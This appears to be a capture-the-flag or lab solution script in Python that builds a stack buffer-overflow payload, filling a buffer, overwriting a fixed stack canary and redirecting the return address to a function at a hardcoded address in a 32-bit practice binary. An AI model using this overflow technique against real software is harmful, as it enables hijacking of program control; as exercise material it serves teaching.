#! /usr/bin/python

exp = ""

# Fill the buffer: `words`
exp += 12 * 'a'

# Replace the canary
# hex(1431721816) >>> 0x55565758 >>> UVWX >>> Reverse order because little endian
exp += "XWVU"

# Fill the Function args??? and the old base pointer
exp += 12 * 'b'

# 0x0804887c: address of exploit function
# The exploit must be in litle endian, i.e. reverse the bytes 
exp += "\x7c\x88\x04\x08"

# 0x0804e300: exit # Cannot use 0x00 as part of the address, as that is the end of the string.
# 0x0804e303: exit+3
exp += "\x03\xe3\x04\x08"

print(exp)




